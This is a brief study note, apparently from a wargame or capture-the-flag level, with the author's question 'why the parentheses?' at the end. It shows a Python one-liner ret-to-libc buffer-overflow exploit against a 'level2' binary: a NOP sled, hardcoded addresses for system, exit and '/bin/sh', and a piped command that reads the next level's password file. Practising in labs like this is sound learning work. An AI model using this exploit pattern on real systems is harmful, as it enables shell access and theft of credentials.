90 is a NOP instruction, good for alignment

(python -c 'print("\x90"*80 
+ "\x08\x04\x85\x3e"[::-1] <- return address of p
+ "\xb7\xe6\xb0\x60"[::-1] <- return address of system
+ "\x08\x04\x83\xd0"[::-1] <- return address of exit
+ "\xb7\xf8\xcc\x58"[::-1] <- return address of "bin/sh" in libc 
)' && echo 'cat /home/user/level3/.pass') | ./level2

why the parentheses?

